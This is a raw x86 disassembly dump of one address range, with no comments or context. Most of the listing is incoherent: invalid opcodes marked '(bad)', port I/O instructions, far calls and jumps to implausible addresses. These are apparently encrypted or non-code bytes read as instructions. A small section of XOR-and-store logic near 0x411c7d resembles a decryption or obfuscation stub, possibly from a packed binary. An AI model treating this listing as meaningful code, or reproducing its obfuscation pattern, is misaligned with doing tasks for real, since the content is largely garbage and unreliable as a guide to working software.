  41180e:	xor    DWORD PTR [edi-0x6da1aa88],0xffffffd4
  411815:	push   ss
  411816:	push   0xe4daf074
  41181b:	clc    
  41181c:	and    eax,0x22803c7e
  411821:	xchg   ebx,eax
  411822:	xor    esi,edi
  411824:	adc    BYTE PTR [ebp-0x24],0x1e
  411828:	jnp    0x4117ad
  41182a:	out    0x82,al
  41182c:	xlat   BYTE PTR ds:[ebx]
  41182d:	jle    0x411859
  41182f:	pop    ebx
  411830:	xchg   ecx,eax
  411831:	push   es
  411832:	fs xchg esi,eax
  411834:	cmp    eax,0xbd68de12
  411839:	cmp    BYTE PTR [eax+0x2b0c758b],cl
  41183f:	ret    0x581
  411842:	cmc    
  411843:	cld    
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	jp     0x41184d
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0xb441017],dl
  41187c:	push   esp
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411845
  411886:	les    ebp,FWORD PTR [edx+0x29]
  411889:	push   eax
  41188a:	dec    esp
  41188b:	and    dh,BYTE PTR [edi]
  41188d:	fist   DWORD PTR [eax]
  41188f:	cmp    bh,dh
  411891:	aas    
  411892:	cdq    
  411893:	aad    0x8a
  411895:	mov    al,ds:0xa4eb060b
  41189a:	inc    esi
  41189c:	fdivr  DWORD PTR [ecx+0x58]
  41189f:	sub    ebx,edi
  4118a1:	mov    cl,ch
  4118a3:	dec    ecx
  4118a4:	push   esp
  4118a5:	sub    ecx,ecx
  4118a7:	or     DWORD PTR [ecx+edx*2],ebx
  4118aa:	cmp    al,ch
  4118ac:	pop    es
  4118ad:	outs   dx,BYTE PTR ds:[esi]
  4118ae:	repz fimul DWORD PTR [edi-0x7211136c]
  4118b5:	sbb    cl,BYTE PTR [edi]
  4118b7:	and    al,0x7c
  4118b9:	or     ebp,ebp
  4118bb:	shl    DWORD PTR [esi+0x7e],cl
  4118be:	out    dx,eax
  4118bf:	nop
  4118c0:	jmp    0x411919
  4118c2:	out    0x16,al
  4118c4:	out    0xc3,al
  4118c6:	xor    ebx,DWORD PTR [edx-0x1b]
  4118c9:	inc    ebx
  4118ca:	dec    esp
  4118cb:	addr16 jns 0x411855
  4118ce:	xchg   ecx,eax
  4118cf:	into   
  4118d0:	pushf  
  4118d1:	inc    ebp
  4118d2:	gs push ss
  4118d4:	adc    cl,cl
  4118d6:	rol    DWORD PTR [ebx-0x66252c84],cl
  4118dc:	cld    
  4118dd:	mov    DWORD PTR [ebx-0x4b],ecx
  4118e0:	cmc    
  4118e1:	loopne 0x411930
  4118e3:	jp     0x411907
  4118e5:	loopne 0x41195d
  4118e7:	mov    ecx,0xb22a3223
  4118ec:	imul   esp,DWORD PTR [eax+0xa9d5cf8],0xffffffe0
  4118f3:	push   edi
  4118f4:	jmp    0xa3a6d23f
  4118f9:	out    0xe9,eax
  4118fb:	add    BYTE PTR [edi+eax*2],dl
  4118fe:	adc    eax,0x5f4c04dc
  411903:	add    DWORD PTR [ecx-0xe122468],edi
  411909:	mov    al,ds:0x70683b95
  41190e:	xchg   dh,al
  411910:	test   eax,0xb4d2b02
  411915:	std    
  411916:	shr    BYTE PTR [edx-0x1f],1
  411919:	xchg   edx,eax
  41191a:	add    BYTE PTR [edi],bl
  41191c:	push   0xffffff95
  41191e:	and    edx,DWORD PTR [edx+0x16]
  411921:	jmp    0xcbc02f4d
  411926:	dec    esi
  411927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411928:	shl    DWORD PTR [ebx+0x5f62463a],cl
  41192e:	out    0x3d,al
  411930:	inc    esi
  411931:	stos   DWORD PTR es:[edi],eax
  411932:	jmp    0x10037211
  411937:	and    bl,dl
  411939:	or     BYTE PTR [edx+0x11],bl
  41193c:	mov    dh,0x77
  41193e:	ds push ds
  411940:	jle    0x41197f
  411942:	idiv   bl
  411944:	add    DWORD PTR [ebx-0x1964a83d],ebx
  41194a:	push   0xffffffbf
  41194c:	int    0x95
  41194e:	mov    ebp,0xc4f53742
  411953:	xchg   edi,eax
  411954:	xor    BYTE PTR [eax+0x4d7d1fe4],dh
  41195a:	push   ss
  41195b:	mov    BYTE PTR [esi-0x3f],bh
  41195e:	das    
  41195f:	adc    eax,0x1e134f76
  411964:	es ds inc edx
  411967:	mov    bl,0x89
  411969:	fild   QWORD PTR [esi]
  41196b:	and    ecx,ebx
  41196d:	cs mov dl,0x4
  411970:	ins    BYTE PTR es:[edi],dx
  411971:	xor    ebp,esi
  411973:	inc    esi
  411974:	xlat   BYTE PTR ds:[ebx]
  411975:	and    DWORD PTR [esi+ebx*2],0xc1c8d50a
  41197c:	aad    0xdb
  41197e:	pop    eax
  41197f:	ds pop edx
  411981:	push   ebp
  411982:	in     al,0x41
  411984:	xchg   edx,eax
  411985:	mov    edi,DWORD PTR [edx-0x61]
  411988:	lods   eax,DWORD PTR ds:[esi]
  411989:	lahf   
  41198a:	pop    esp
  41198b:	mov    edi,0x10e61e82
  411990:	push   es
  411991:	nop
  411992:	xor    cl,dh
  411994:	cmc    
  411995:	xchg   ecx,eax
  411996:	out    dx,al
  411997:	inc    ebp
  411998:	inc    esi
  411999:	xchg   esi,eax
  41199a:	cld    
  41199b:	lods   al,BYTE PTR ds:[esi]
  41199c:	in     eax,dx
  41199d:	scas   eax,DWORD PTR es:[edi]
  41199e:	push   ds
  41199f:	dec    edx
  4119a0:	les    esi,FWORD PTR [edx+0x1a]
  4119a3:	xor    esp,ebp
  4119a5:	rol    dl,1
  4119a7:	jg     0x4119de
  4119a9:	fcomp  st(2)
  4119ab:	popf   
  4119ac:	cmp    edx,eax
  4119ae:	fwait
  4119af:	ret    
  4119b0:	ficom  WORD PTR [esi]
  4119b2:	fdivr  QWORD PTR [ebp-0x68]
  4119b5:	adc    ah,bl
  4119b7:	clc    
  4119b8:	and    BYTE PTR [eax+0x1ff6bea5],0xa1
  4119bf:	mov    eax,0xbaf83f31
  4119c4:	push   0xfffffff7
  4119c6:	sub    DWORD PTR [edx-0x29c9b9e8],esi
  4119cc:	xor    eax,0x695c9012
  4119d1:	loope  0x411a50
  4119d3:	sti    
  4119d4:	sub    DWORD PTR [esi],eax
  4119d6:	xchg   edi,eax
  4119d7:	jno    0x4119b1
  4119d9:	mov    WORD PTR [esi],es
  4119db:	es and eax,0xed44e19b
  4119e1:	mov    ebp,0xcb5d8402
  4119e6:	cli    
  4119e7:	das    
  4119e8:	into   
  4119e9:	je     0x4119aa
  4119eb:	pop    ss
  4119ec:	mov    ch,0xdd
  4119ee:	dec    eax
  4119ef:	add    esi,edx
  4119f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f2:	mov    al,ds:0x8d2d373
  4119f7:	add    DWORD PTR [ebx+ecx*4-0xb],edi
  4119fb:	xrelease mov BYTE PTR [edx],ah
  4119fe:	jp     0x411a2c
  411a00:	sahf   
  411a01:	jg     0x411a06
  411a03:	push   ds
  411a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a05:	jbe    0x411a5c
  411a07:	les    edx,FWORD PTR [eax+0x60]
  411a0a:	inc    esp
  411a0b:	xchg   ebx,eax
  411a0c:	jns    0x4119df
  411a0e:	cld    
  411a0f:	sti    
  411a10:	shl    BYTE PTR [edi+0x7e],1
  411a13:	xor    dl,BYTE PTR [eax]
  411a15:	dec    edx
  411a16:	pop    ebp
  411a17:	inc    eax
  411a18:	icebp  
  411a19:	sub    al,0xa3
  411a1b:	push   cs
  411a1c:	std    
  411a1d:	or     BYTE PTR [ecx-0x50fcfdf9],ah
  411a23:	call   0xdd88:0x24287aa
  411a2a:	pop    esp
  411a2b:	fstp   QWORD PTR [edi+0x53eb1e6e]
  411a31:	out    dx,al
  411a32:	fcomp  QWORD PTR [ebx+0x2c1a44cc]
  411a38:	sbb    al,0x53
  411a3a:	and    eax,0x9aca21e8
  411a3f:	test   al,0xab
  411a41:	retf   
  411a42:	sbb    BYTE PTR [edx*2-0x39f3941a],dh
  411a49:	mov    esp,0xdf9add65
  411a4e:	aad    0xaf
  411a50:	mov    edi,0x15279a16
  411a55:	jl     0x411a9d
  411a57:	mov    esp,0xf2be599b
  411a5c:	fild   WORD PTR [ebx+0x2]
  411a5f:	(bad)  
  411a60:	fnstenv [esp+edi*4-0x695641]
  411a67:	mov    ds:0xebcc395f,eax
  411a6c:	cmp    esp,DWORD PTR ds:0x8c26fb6e
  411a72:	shl    BYTE PTR [eiz*2-0x53f63742],1
  411a79:	nop
  411a7a:	icebp  
  411a7b:	pop    esi
  411a7c:	or     esp,DWORD PTR [ecx]
  411a7e:	pop    ss
  411a7f:	scas   eax,DWORD PTR es:[edi]
  411a80:	(bad)  
  411a81:	fdiv   QWORD PTR [ecx-0x30]
  411a84:	adc    al,0x72
  411a86:	popf   
  411a87:	lods   eax,DWORD PTR ds:[esi]
  411a88:	sbb    ch,BYTE PTR cs:[edx+0x37f1e2da]
  411a8f:	sbb    al,0x32
  411a91:	sbb    ch,BYTE PTR ss:[esi]
  411a94:	inc    esp
  411a95:	jne    0x411a3c
  411a97:	pushf  
  411a98:	inc    ecx
  411a99:	mov    al,0xaa
  411a9b:	push   0x3756a438
  411aa0:	mov    ds:0x86135cfa,eax
  411aa5:	mov    ds,WORD PTR [eax]
  411aa7:	fist   WORD PTR [ebx+ebp*1-0x58]
  411aab:	push   esp
  411aac:	cmp    al,0x7a
  411aae:	ret    0xc5bc
  411ab1:	gs cs out dx,al
  411ab4:	xchg   esp,eax
  411ab5:	mov    dl,0x86
  411ab7:	in     eax,dx
  411ab8:	fnstsw WORD PTR [ebx+0x67b89b51]
  411abe:	mov    ah,0xab
  411ac0:	cwde   
  411ac1:	pop    ebp
  411ac2:	adc    dl,al
  411ac4:	shr    BYTE PTR [edi-0x71],0x7
  411ac8:	mov    edx,0x67e51db2
  411acd:	lea    eax,[ebx+0x5170bdc5]
  411ad3:	push   edi
  411ad4:	xchg   ecx,eax
  411ad5:	repz cmc 
  411ad7:	loop   0x411af6
  411ad9:	fxam   
  411adb:	xor    BYTE PTR [esi-0x612f0d14],ah
  411ae1:	ret    0x1c16
  411ae4:	popa   
  411ae5:	or     eax,0xf44b4a92
  411aea:	adc    ebp,DWORD PTR [edx+0x749ccef8]
  411af0:	sub    eax,0xbee90e8d
  411af5:	jmp    0x3d29edd
  411afa:	and    bl,BYTE PTR [esi+0x73692cbd]
  411b00:	ficom  WORD PTR [eax]
  411b02:	pop    ss
  411b03:	int    0xa0
  411b05:	neg    eax
  411b07:	dec    ecx
  411b08:	pushf  
  411b09:	cmp    al,0x6c
  411b0b:	inc    ebp
  411b0c:	out    dx,eax
  411b0d:	shl    DWORD PTR [edx],1
  411b0f:	jb     0x411b0a
  411b11:	int3   
  411b12:	sub    al,0x70
  411b14:	dec    esi
  411b15:	sub    al,0x34
  411b17:	rol    BYTE PTR [edx+ebx*2+0x7d],0xdf
  411b1c:	pop    ebx
  411b1d:	mov    cl,0x22
  411b1f:	cwde   
  411b20:	xor    BYTE PTR [ecx-0x54f1189f],dl
  411b26:	mov    ch,0x80
  411b28:	or     BYTE PTR [edx+ecx*1],ah
  411b2b:	mov    esi,0x5ba75857
  411b30:	das    
  411b31:	push   es
  411b32:	retf   
  411b33:	mov    esp,0x72e505f0
  411b38:	jo     0x411ba4
  411b3a:	(bad)  
  411b3b:	mov    dl,0x73
  411b3d:	ins    DWORD PTR es:[edi],dx
  411b3e:	stos   DWORD PTR es:[edi],eax
  411b3f:	dec    esi
  411b40:	ins    DWORD PTR es:[edi],dx
  411b41:	jb     0x411b72
  411b43:	pusha  
  411b44:	ret    
  411b45:	push   ds
  411b46:	pop    esp
  411b47:	in     eax,0xda
  411b49:	mov    ds:0x398e8ccd,al
  411b4e:	int    0x6e
  411b50:	dec    edi
  411b51:	rol    DWORD PTR [edx-0x3244e633],0x4a
  411b58:	sbb    eax,0x55af6816
  411b5d:	mov    esi,0xa0a2aa0
  411b62:	push   eax
  411b63:	mov    dh,0x9a
  411b65:	jmp    0x411af6
  411b67:	rcr    BYTE PTR [eax],1
  411b69:	leave  
  411b6a:	add    al,0xaa
  411b6c:	jl     0x411be6
  411b6e:	jle    0x411ba9
  411b70:	pop    edi
  411b71:	push   ecx
  411b72:	or     esp,DWORD PTR [ebp-0x33]
  411b75:	or     edi,DWORD PTR [edi-0x5b]
  411b78:	and    ah,ah
  411b7a:	mov    al,ds:0xf69f32fc
  411b7f:	out    dx,eax
  411b80:	adc    edi,esp
  411b82:	pushf  
  411b83:	test   DWORD PTR [ebp+esi*8+0x24b721a0],0x451796be
  411b8e:	or     eax,0xde3c9d00
  411b93:	je     0x411bb7
  411b95:	out    0x45,eax
  411b97:	adc    BYTE PTR [edi-0x2],cl
  411b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b9b:	mov    cl,0x37
  411b9d:	inc    esp
  411b9e:	rol    BYTE PTR fs:[ebp+0x19],cl
  411ba2:	and    DWORD PTR [eax-0x28],esp
  411ba5:	sub    DWORD PTR ds:0x36dd09e3,esi
  411bab:	jnp    0x411b30
  411bad:	sbb    DWORD PTR [ecx],0xffffffef
  411bb0:	arpl   sp,si
  411bb2:	pop    ds
  411bb3:	xchg   edx,eax
  411bb4:	outs   dx,BYTE PTR ds:[esi]
  411bb5:	fimul  DWORD PTR [edi]
  411bb7:	push   ebx
  411bb8:	or     edi,DWORD PTR [eax-0x67a30b1e]
  411bbe:	cmp    BYTE PTR [esi],bl
  411bc0:	sbb    BYTE PTR [ebp-0x7da76278],dl
  411bc6:	imul   ecx,DWORD PTR [edx+0x627f2959],0xcf00183d
  411bd0:	jae    0x411c19
  411bd2:	hlt    
  411bd3:	call   0xc3097aa4
  411bd8:	ror    BYTE PTR [ebx-0xc],cl
  411bdb:	pop    ebx
  411bdc:	ss loopne 0x411c35
  411bdf:	arpl   WORD PTR [esi],cx
  411be1:	mov    ebp,0x33659d92
  411be6:	repnz cmc 
  411be8:	add    DWORD PTR [edi+0x7b3ffb6a],edi
  411bee:	push   ss
  411bef:	push   ecx
  411bf0:	mov    esp,0x5473f9a8
  411bf5:	and    dl,BYTE PTR [ebx]
  411bf7:	ret    0x48bf
  411bfa:	mov    dh,0xa3
  411bfc:	iret   
  411bfd:	fnstenv [ebp-0x66a5f7ff]
  411c03:	dec    esp
  411c04:	sub    al,0xed
  411c06:	mov    eax,ds:0x684aa8ec
  411c0b:	or     BYTE PTR [eax+0x64a94b03],ah
  411c11:	(bad)  
  411c12:	xor    BYTE PTR [edi],bl
  411c14:	js     0x411bb7
  411c16:	(bad)  
  411c18:	sbb    eax,esp
  411c1a:	pop    esp
  411c1b:	loope  0x411c47
  411c1d:	inc    ecx
  411c1e:	and    eax,0x9f3d6dd5
  411c23:	rol    BYTE PTR [eax],0x80
  411c26:	das    
  411c27:	push   DWORD PTR [esi-0x4c]
  411c2a:	mov    ch,0x5b
  411c2c:	lahf   
  411c2d:	nop/reserved BYTE PTR [edx-0x30]
  411c31:	push   eax
  411c32:	scas   eax,DWORD PTR es:[edi]
  411c33:	rcr    DWORD PTR [ebx],cl
  411c35:	retf   0xeae
  411c38:	mov    al,ds:0x50fdfb4
  411c3d:	imul   edx,DWORD PTR [edx-0x928e92a],0x39
  411c44:	jmp    0x411bd9
  411c46:	shl    DWORD PTR [eax],1
  411c48:	xlat   BYTE PTR ds:[ebx]
  411c49:	dec    ebx
  411c4a:	test   al,0x64
  411c4c:	mov    ebx,DWORD PTR [eax+0x74]
  411c4f:	mov    ch,BYTE PTR ds:0x56d2f621
  411c55:	or     ebp,DWORD PTR [ebp-0x2a93a01b]
  411c5b:	loop   0x411c7c
  411c5d:	push   0x12fcf59
  411c62:	and    al,0x6f
  411c64:	aaa    
  411c65:	jp     0x411be9
  411c67:	sub    bl,BYTE PTR [eax-0x5e]
  411c6a:	popa   
  411c6b:	fnsave [eax-0x5f]
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xdcf1085e
  411cb8:	mov    eax,ds:0x7070535e
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411d0b
  411cc2:	add    cl,0x65
  411cc5:	mov    WORD PTR [ebx],ds
  411cc7:	retf   
  411cc8:	mov    al,0x73
  411cca:	lods   al,BYTE PTR ds:[esi]
  411ccb:	or     BYTE PTR [ecx],ah
  411ccd:	mov    cl,0xf8
  411ccf:	push   ss
  411cd0:	mov    ch,0x22
  411cd2:	xchg   ebp,eax
  411cd3:	mov    BYTE PTR [ebx-0x32e375ab],al
  411cd9:	mov    ah,0x28
  411cdb:	xlat   BYTE PTR ds:[ebx]
  411cdc:	aas    
  411cdd:	pop    es
  411cde:	jb     0x411cf0
  411ce0:	mov    DWORD PTR [esi+0x16b57b8],eax
  411ce6:	lock pop ebx
  411ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ce9:	test   eax,0xb7321b8a
  411cee:	popf   
  411cef:	pop    edx
  411cf0:	mov    al,ds:0x601ea1ea
  411cf5:	pop    es
  411cf6:	or     eax,0x6ef234cc
  411cfb:	dec    ebp
  411cfc:	mov    ebp,0x4e715e71
  411d01:	mov    ds:0xc6eff3d9,al
  411d06:	sbb    al,0x17
  411d08:	call   0xf65b:0xced1dca0
  411d0f:	ret    0x5e59
  411d12:	dec    esp
  411d13:	and    ah,BYTE PTR [edi-0x47ed0b3c]
  411d19:	add    al,0xc6
  411d1b:	xor    ecx,edx
  411d1d:	push   cs
  411d1e:	pop    es
  411d1f:	mov    ds:0xfa850463,eax
  411d24:	sbb    ch,0x73
  411d27:	sub    bh,BYTE PTR [ebx-0x7a]
  411d2a:	std    
  411d2b:	add    eax,0x62b1673e
  411d30:	stc    
  411d31:	or     BYTE PTR [edi+0x46907400],ah
  411d37:	loopne 0x411d5f
  411d39:	(bad)  
  411d3a:	loop   0x411d90
  411d3c:	je     0x411d2e
  411d3e:	pop    esi
  411d3f:	dec    ebx
  411d40:	call   0x86820e17
  411d45:	or     al,0x33
  411d47:	loop   0x411d8a
  411d49:	imul   eax,ecx,0x1a6a75fb
  411d4f:	mov    edx,0x41caed5f
  411d54:	xchg   DWORD PTR ds:0xf413ca1a,edx
  411d5a:	inc    edi
  411d5b:	mov    esp,0xdc13ed05
  411d60:	add    al,bh
  411d62:	push   es
  411d63:	push   ds
  411d64:	and    eax,0xd97da78d
  411d69:	out    0x67,al
  411d6b:	cmc    
  411d6c:	mov    ebx,0x337ebf
  411d71:	jmp    0xe087bbae
  411d76:	inc    esi
  411d77:	inc    eax
  411d78:	(bad)
  411d7c:	xchg   edx,eax
  411d7d:	push   eax
  411d7e:	mov    ch,0xb8
  411d80:	repnz xor cl,BYTE PTR ds:[esi+0x52]
  411d85:	mov    edi,0xe73fd880
  411d8a:	(bad)  
  411d8c:	xchg   ebp,eax
  411d8d:	ins    DWORD PTR es:[edi],dx
  411d8e:	inc    ebx
  411d8f:	push   ds
  411d90:	sub    cl,bl
  411d92:	cmp    DWORD PTR [esi+0x3c],edx
  411d95:	mov    BYTE PTR [ebp+esi*4+0x655a6634],ah
  411d9c:	pusha  
  411d9d:	pop    sp
  411d9f:	cmp    al,0xee
  411da1:	xor    dh,BYTE PTR [edi]
  411da3:	pusha  
  411da4:	mov    WORD PTR [ecx],ss
  411da6:	push   ds
  411da7:	movaps xmm7,xmm7
  411daa:	dec    esi
  411dab:	das    
  411dac:	js     0x411d67
  411dae:	mov    bl,0x72
  411db0:	mov    dh,0x84
  411db2:	loopne 0x411dc9
  411db4:	sbb    ch,BYTE PTR [eax-0x5923f8d3]
  411dba:	aaa    
  411dbb:	and    ebp,esp
  411dbd:	xchg   edi,eax
  411dbe:	or     ah,bh
  411dc0:	pusha  
  411dc1:	pop    ebp
  411dc2:	lea    ebx,[edi]
  411dc4:	loope  0x411dc7
  411dc6:	add    edi,0xf8c86584
  411dcc:	aam    0x38
  411dce:	test   bh,al
  411dd0:	push   ss
  411dd1:	in     al,dx
  411dd2:	xchg   ecx,eax
  411dd3:	fs ret 0x6454
  411dd7:	and    ecx,DWORD PTR [ebx-0x494c1742]
  411ddd:	rcl    BYTE PTR [ebp+0x46],cl
  411de0:	stos   BYTE PTR es:[edi],al
  411de1:	or     BYTE PTR [ebp-0x4c16555c],bh
  411de7:	pop    ss
  411de8:	out    dx,al
  411de9:	adc    DWORD PTR [edi+0x6ff9fd2e],0xfffffffb
  411df0:	push   esi
  411df1:	push   eax
  411df2:	add    esp,DWORD PTR [ebx-0x20]
  411df5:	jg     0x411e11
  411df7:	or     esp,DWORD PTR [ebx-0x23]
  411dfa:	pop    es
  411dfb:	cs xchg ebp,eax
  411dfd:	mov    ecx,0x8a407041
  411e02:	mov    edx,0x1792c324
  411e07:	or     bl,BYTE PTR [edx]
  411e09:	mov    ebp,0x8acd7d71
  411e0e:	pop    es
  411e0f:	and    al,0x1d
  411e11:	push   edx
  411e12:	pop    edx
  411e13:	ficomp WORD PTR [edi-0x18]
  411e16:	in     al,0xe2
  411e18:	mov    ah,0x7a
  411e1a:	mov    WORD PTR [edx-0x19],gs
  411e1d:	hlt    
  411e1e:	mul    esi
  411e20:	retf   0x6342
  411e23:	inc    ebx
  411e24:	mov    ds:0x223546ec,eax
  411e29:	(bad)  
  411e2a:	sub    BYTE PTR [ebx+eax*4-0x2e7fbea7],ah
  411e31:	mov    es,ecx
  411e33:	(bad)  
  411e34:	js     0x411dc2
  411e36:	adc    edx,eax
  411e38:	int3   
  411e39:	rol    DWORD PTR [ebp-0x38],1
  411e3c:	mov    dl,BYTE PTR [ebp+0x41]
  411e3f:	ss sub dh,0x45
  411e43:	stc    
  411e44:	pop    edi
  411e45:	call   0x53a44074
  411e4a:	or     ah,bh
  411e4c:	sbb    bl,BYTE PTR [edi-0x2af58187]
  411e52:	sub    edi,edi
  411e54:	push   0x16
  411e56:	icebp  
  411e57:	mov    ch,0x13
  411e59:	inc    ecx
  411e5a:	in     al,0xbd
  411e5c:	dec    edi
  411e5d:	push   cs
  411e5e:	leave  
  411e5f:	jbe    0x411e19
  411e61:	push   ecx
  411e62:	mov    al,0xbb
  411e64:	dec    esi
  411e65:	jnp    0x411df9
  411e67:	js     0x411e0a
  411e69:	sbb    DWORD PTR [edx+0x1de6fc4b],eax
  411e6f:	je     0x411e85
  411e71:	dec    esp
  411e72:	dec    esi
  411e73:	xchg   ebx,esi
  411e75:	in     al,dx
  411e76:	test   DWORD PTR [edi-0x74269771],esi
  411e7c:	or     DWORD PTR [edx+0x24],eax
  411e7f:	jle    0x411ea2
  411e81:	add    dl,BYTE PTR ds:0xfead7a5d
  411e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e88:	pusha  
  411e89:	test   eax,0x95c57e49
  411e8e:	adc    DWORD PTR [ebx+0x4a42b216],esp
  411e94:	sub    bh,BYTE PTR [edx]
  411e96:	push   cs
  411e97:	dec    edi
  411e98:	xor    al,0xa9
  411e9a:	xor    esp,edx
  411e9c:	inc    eax
  411e9d:	cli    
  411e9e:	pop    ss
  411e9f:	push   ss
  411ea0:	ins    DWORD PTR es:[edi],dx
  411ea1:	pop    ebx
  411ea2:	leave  
  411ea3:	(bad)  
  411ea4:	sub    DWORD PTR [esi+0x5a],edx
  411ea7:	mov    ?,WORD PTR [ebx+0x26]
  411eaa:	sbb    eax,DWORD PTR [edx+esi*4+0x63]
  411eae:	in     eax,0x7
  411eb0:	inc    ebx
  411eb1:	fldcw  WORD PTR [edi+edi*1-0x3]
  411eb5:	push   ss
  411eb6:	rcl    DWORD PTR [esi],0x27
  411eb9:	jecxz  0x411f30
  411ebb:	rcr    DWORD PTR [edi],1
  411ebd:	js     0x411ef1
  411ebf:	or     ch,dl
  411ec1:	cld    
  411ec2:	mov    dl,0x8
  411ec4:	lock cmp dl,ah
  411ec7:	xor    ebp,esi
  411ec9:	sbb    DWORD PTR [ebp-0x5407cd73],0x4e
  411ed0:	ss push 0xbfa2ec58
  411ed6:	in     eax,0xc1
  411ed8:	repnz lods al,BYTE PTR ds:[esi]
  411eda:	stc    
  411edb:	outs   dx,BYTE PTR ds:[esi]
  411edc:	xor    al,0x62
  411ede:	push   edx
  411edf:	xchg   BYTE PTR [esi+0x3c],bl
  411ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ee3:	aas    
  411ee4:	das    
  411ee5:	add    dl,BYTE PTR [ebx-0x2b7c88d5]
  411eeb:	add    eax,0x38317885
  411ef0:	mul    BYTE PTR [ebx-0x63]
  411ef3:	outs   dx,BYTE PTR ds:[esi]
  411ef4:	pop    ss
  411ef5:	scas   eax,DWORD PTR es:[edi]
  411ef6:	sahf   
  411ef7:	es loopne 0x411f0f
  411efa:	shr    BYTE PTR [eax+0x6f],0x1f
  411efe:	ins    DWORD PTR es:[edi],dx
  411eff:	fbstp  TBYTE PTR [ebx]
  411f01:	inc    ecx
  411f02:	and    ah,BYTE PTR [esi+0x3e]
  411f05:	dec    esp
  411f06:	mov    ebx,DWORD PTR [eax]
  411f08:	xor    BYTE PTR ds:0xc21c3627,ch
  411f0e:	pop    ebp
  411f0f:	mov    DWORD PTR [edx],ebx
  411f11:	cmp    esi,DWORD PTR [edi+0x454966fd]
  411f17:	xchg   edx,eax
  411f18:	mov    BYTE PTR [edi-0x7a],ch
  411f1b:	fwait
  411f1c:	cmp    dh,bl
  411f1e:	fsub   QWORD PTR [edx]
  411f20:	push   ebp
  411f21:	or     al,bh
  411f23:	inc    esp
  411f24:	mov    ah,0xd3
  411f26:	retw   0x9788
  411f2a:	pop    edx
  411f2b:	pop    ebx
  411f2c:	cmp    BYTE PTR [ecx-0x22],ch
  411f2f:	fmul   st(4),st
  411f31:	sub    BYTE PTR [edi],ch
  411f33:	out    0xc4,al
  411f35:	ss mov ecx,0x39ab02fe
  411f3b:	pusha  
  411f3c:	dec    ecx
  411f3d:	xor    BYTE PTR [edi-0x2e401d37],bh
  411f43:	jns    0x411f8e
  411f45:	ins    DWORD PTR es:[edi],dx
  411f46:	std    
  411f47:	mov    ah,0xde
  411f49:	mov    al,ds:0x8f10af1
  411f4e:	leave  
  411f4f:	push   eax
  411f50:	imul   ecx,DWORD PTR [eax],0x20a2f318
  411f56:	out    dx,al
  411f57:	mov    cl,dh
  411f59:	push   esp
  411f5a:	je     0x411f60
  411f5c:	bound  edi,QWORD PTR [edi]
  411f5e:	inc    ecx
  411f5f:	shr    BYTE PTR [edi-0x50],0x19
  411f63:	pop    ebx
  411f64:	sub    eax,0xf4863c04
  411f69:	xchg   esp,eax
  411f6a:	les    ebp,FWORD PTR [ebx]
  411f6c:	xor    ch,al
  411f6e:	push   eax
  411f6f:	or     al,0xb0
  411f71:	call   0x262b:0xab0b8930
  411f78:	shl    ch,cl
  411f7a:	mov    eax,ds:0x8300ecbc
  411f7f:	jo     0x3ad420e3
  411f85:	fild   DWORD PTR [esp+esi*8+0x3c719bbe]
  411f8c:	push   esp
  411f8d:	repz add eax,edx
  411f90:	stc    
  411f91:	into   
  411f92:	and    ebp,DWORD PTR [esi+edi*2+0x18]
  411f96:	add    eax,0xd9b9a3dc
  411f9b:	sub    esp,DWORD PTR [ecx+0x776d6165]
  411fa1:	call   0x5f9:0x455212a7
  411fa8:	adc    bh,bl
  411faa:	fst    DWORD PTR [eax]
  411fac:	outs   dx,DWORD PTR ds:[esi]
  411fad:	sbb    ebx,DWORD PTR [ecx+0x31]
  411fb0:	fbld   TBYTE PTR [ecx+0x7c]
  411fb3:	retf   
  411fb4:	bnd jo 0x411f7b
  411fb7:	or     cl,BYTE PTR [eax-0x1e262afc]
  411fbd:	mov    esi,0x7d4f536c
  411fc2:	btr    DWORD PTR [ebp-0x6d],ebp
  411fc6:	xchg   edi,eax
  411fc7:	test   eax,0xe70b9181
  411fcc:	repnz fcomp DWORD PTR [esi+edi*1]
  411fd0:	pop    ebp
  411fd1:	mov    ecx,0x7077a022
  411fd6:	mov    ds:0x1f802ed0,eax
  411fdb:	mov    dh,0x63
  411fdd:	pop    eax
  411fde:	repnz fsubrp st(6),st
  411fe1:	leave  
  411fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fe3:	fidiv  WORD PTR [eax+0x1f]
  411fe6:	retf   
  411fe7:	adc    BYTE PTR [edi],ah
  411fe9:	adc    al,0x4a
  411feb:	pop    eax
  411fec:	push   0x3c6b06b
